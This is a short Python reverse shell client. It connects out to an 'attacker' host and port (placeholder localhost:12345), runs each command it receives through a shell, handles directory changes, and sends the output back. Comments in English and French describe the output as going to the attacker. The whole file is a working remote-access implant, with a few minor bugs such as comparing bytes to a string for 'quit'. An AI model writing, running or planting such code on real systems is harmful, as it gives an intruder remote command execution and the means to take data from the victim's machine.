import socket
import subprocess, os

HOST = "localhost"  # attacker's IP adress (this is a random one, just to show you)
PORT = 12345  # attacker's port on which server is listening

# same syntax here as for the server
connexion_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connexion_socket.connect((HOST, PORT))
print("\n[*] Connected to " + HOST + " on port " + str(PORT) + ".\n")

while True:

    command = connexion_socket.recv(1024)
    split_command = command.split()
    print("Received command : " + command.decode())

    # if its quit, then break out and close socket
    if command == "quit":
        break

    if (command.split()[0] == "cd"):
        if len(command.split()) == 1:
            connexion_socket.send(str.encode(os.getcwd()))
        elif len(command.split()) == 2:
            try:
                os.chdir(command.split()[1])
                connexion_socket.send(str.encode("Changed directory to " + os.getcwd()))
            except(WindowsError):
                connexion_socket.send(str.encode("No such directory : " + os.getcwd()))

    else:
        # do shell command
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        print(stdout_value.decode() + "\n")
        # send output to attacker
        if (stdout_value != ""):
            connexion_socket.send(stdout_value)  # renvoit l'output  à l'attaquant
        else:
            connexion_socket.send(command + str.encode(" does not return anything"))

connexion_socket.close()